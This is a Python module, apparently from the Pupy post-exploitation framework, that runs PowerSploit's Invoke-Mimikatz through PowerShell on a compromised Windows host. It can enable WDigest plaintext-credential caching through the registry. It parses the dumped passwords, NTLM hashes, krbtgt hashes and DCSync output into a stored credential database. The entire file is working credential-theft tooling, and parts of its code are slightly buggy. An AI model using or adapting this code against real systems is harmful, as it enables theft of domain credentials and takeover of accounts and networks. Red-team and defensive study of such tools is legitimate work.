# -*- coding: UTF8 -*-
from pupylib.PupyModule import *
import os
import re
from modules.lib.windows.powershell_upload import execute_powershell_script
from pupylib.utils.credentials import Credentials

__class_name__="Mimikatz_Powershell"
ROOT=os.path.abspath(os.path.join(os.path.dirname(__file__),".."))

@config(compat="windows", category="creds")
class Mimikatz_Powershell(PupyModule):
    """ 
        execute mimikatz using powershell
    """
    
    def init_argparse(self):

        commands_available = '''
Commandes available:\n
Invoke-Mimikatz -DumpCerts
Invoke-Mimikatz -DumpCreds -ComputerName @("computer1", "computer2")
Invoke-Mimikatz -Command "privilege::debug exit" -ComputerName "computer1"
'''
        self.arg_parser = PupyArgumentParser(prog="Mimikatz_Powershell", description=self.__doc__, epilog=commands_available)
        self.arg_parser.add_argument("--wdigest", choices={'check', 'enable', 'disable'}, default='', help="Creates/Deletes the 'UseLogonCredential' registry key enabling WDigest cred dumping on Windows >= 8.1")
        self.arg_parser.add_argument("-o", metavar='COMMAND', dest='command', default='Invoke-Mimikatz', help='command not needed')

    def run(self, args):
        
        # for windows 10, if the UseLogonCredential registry is not present or disable (equal to 0), not plaintext password can be retrieved using mimikatz.
        if args.wdigest:
            self.client.load_package("pupwinutils.wdigest")
            ok, message = self.client.conn.modules["pupwinutils.wdigest"].wdigest(args.wdigest)
            if ok: 
                self.success(message)
            else:
                self.warning(str(message))
            return

        script ='mimikatz'

        # check if file has been already uploaded to the target
        for arch in ['x64', 'x86']:
            if script not in self.client.powershell[arch]['scripts_loaded']:
                content = open(os.path.join(ROOT, "external", "PowerSploit", "Exfiltration", "Invoke-Mimikatz.ps1"), 'r').read()
            else:
                content = ''

        output = execute_powershell_script(self, content, args.command, x64IfPossible=True, script_name=script)
        if not output:
            self.error("Error running mimikatz. Enough privilege ?")
            return
        self.success("%s" % output)
        
        creds = self.parse_mimikatz(output)
        db = Credentials()
        db.add(creds)
        self.success("Credentials stored on the database")

    def parse_mimikatz(self, data):
        """
        Parse the output from Invoke-Mimikatz to return credential sets.
        This was directly stolen from the Empire project as well.
        """

        # cred format:
        #   credType, domain, username, password, hostname, sid
        creds = []

        # regexes for "sekurlsa::logonpasswords" Mimikatz output
        regexes = ["(?s)(?<=msv :).*?(?=tspkg :)", "(?s)(?<=tspkg :).*?(?=wdigest :)", "(?s)(?<=wdigest :).*?(?=kerberos :)", "(?s)(?<=kerberos :).*?(?=ssp :)", "(?s)(?<=ssp :).*?(?=credman :)", "(?s)(?<=credman :).*?(?=Authentication Id :)", "(?s)(?<=credman :).*?(?=mimikatz)"]

        hostDomain = ""
        domainSid = ""
        hostName = ""

        lines = data.split("\n")
        for line in lines[0:2]:
            if line.startswith("Hostname:"):
                try:
                    domain = line.split(":")[1].strip()
                    temp = domain.split("/")[0].strip()
                    domainSid = domain.split("/")[1].strip()

                    hostName = temp.split(".")[0]
                    hostDomain = ".".join(temp.split(".")[1:])
                except:
                    pass

        for regex in regexes:

            p = re.compile(regex)

            for match in p.findall(data):

                lines2 = match.split("\n")
                username, domain, password = "", "", ""
                
                for line in lines2:
                    try:
                        if "Username" in line:
                            username = line.split(":",1)[1].strip()
                        elif "Domain" in line:
                            domain = line.split(":",1)[1].strip()
                        elif "NTLM" in line or "Password" in line:
                            password = line.split(":",1)[1].strip()
                    except:
                        pass

                    if password:
                        if username != "" and password != "" and password != "(null)":
                            
                            sid = ""

                            # substitute the FQDN in if it matches
                            if hostDomain.startswith(domain.lower()):
                                domain = hostDomain
                                sid = domainSid

                            store = False
                            category = ''
                            if self.validate_ntlm(password):
                                credType = "Hash"
                                category = 'NTLM hash'
                                if not username.endswith("$"):
                                    store = True

                            else:
                                credType = "Password"
                                category = 'System password'
                                # ignore big hex password
                                if  len(password) < 300:
                                    store = True

                            result = {'Domain': domain, 'Login': username, credType:password, 'CredType': credType.lower(), 'Host': hostName, 'sid':sid, 'Category': category, 'uid': self.client.short_name()}
                            # do not store password if it has already been stored
                            for c in creds:
                                if c == result:
                                    store = False
                            if store:
                                creds.append(result)
                        username, domain, password = "", "", ""
                        
        if len(creds) == 0:
            # check if we have lsadump output to check for krbtgt
            # happens on domain controller hashdumps
            for x in xrange(8,13):
                if lines[x].startswith("Domain :"):

                    domain, sid, krbtgtHash = "", "", ""

                    try:
                        domainParts = lines[x].split(":")[1]
                        domain = domainParts.split("/")[0].strip()
                        sid = domainParts.split("/")[1].strip()

                        # substitute the FQDN in if it matches
                        if hostDomain.startswith(domain.lower()):
                            domain = hostDomain
                            sid = domainSid

                        for x in xrange(0, len(lines)):
                            if lines[x].startswith("User : krbtgt"):
                                krbtgtHash = lines[x+2].split(":")[1].strip()
                                break

                        if krbtgtHash != "":
                            creds.append({'Domain': domain, 'Login': user, 'Hash': krbtgtHash, 'Host': hostName, 'CredType': 'hash', 'sid':sid, 'Category': 'krbtgt hash', 'uid': self.client.short_name()})
                    except Exception as e:
                        pass

        if len(creds) == 0:
            # check if we get lsadump::dcsync output
            if '** SAM ACCOUNT **' in lines:
                domain, user, userHash, dcName, sid = "", "", "", "", ""
                for line in lines:
                    try:
                        if line.strip().endswith("will be the domain"):
                            domain = line.split("'")[1]
                        elif line.strip().endswith("will be the DC server"):
                            dcName = line.split("'")[1].split(".")[0]
                        elif line.strip().startswith("SAM Username"):
                            user = line.split(":")[1].strip()
                        elif line.strip().startswith("Object Security ID"):
                            parts = line.split(":")[1].strip().split("-")
                            sid = "-".join(parts[0:-1])
                        elif line.strip().startswith("Hash NTLM:"):
                            userHash = line.split(":")[1].strip()
                    except:
                        pass

                if domain != "" and userHash != "":
                    creds.append({'Domain': domain, 'Login': user, 'Hash': userHash, 'Host': dcName, 'CredType': 'hash', 'SID':sid, 'Category': 'NTLM hash', 'uid': self.client.short_name()})

        return creds

    def validate_ntlm(self, data):
        allowed = re.compile("^[0-9a-f]{32}", re.IGNORECASE)
        if allowed.match(data):
            return True
        else:
            return False
